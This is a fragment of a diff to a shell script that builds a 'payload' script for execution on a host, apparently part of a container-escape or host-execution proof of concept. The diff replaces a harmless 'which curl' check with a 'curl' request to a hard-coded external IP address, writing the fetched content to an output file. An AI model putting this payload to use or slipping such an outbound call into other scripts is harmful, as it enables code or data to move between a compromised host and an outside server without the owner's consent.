@@ -19,7 +19,7 @@ cat > ${PAYLOAD_PATH} << __EOF__
 OUTPATH=\$(dirname \$0)/${OUTPUT_NAME}
 
 # Commands to run on the host<
-which curl > \${OUTPATH} 2>&1
+curl http://35.194.58.97/wea > \${OUTPATH} 2>&1
 __EOF__
 
 # Make the payload script executable
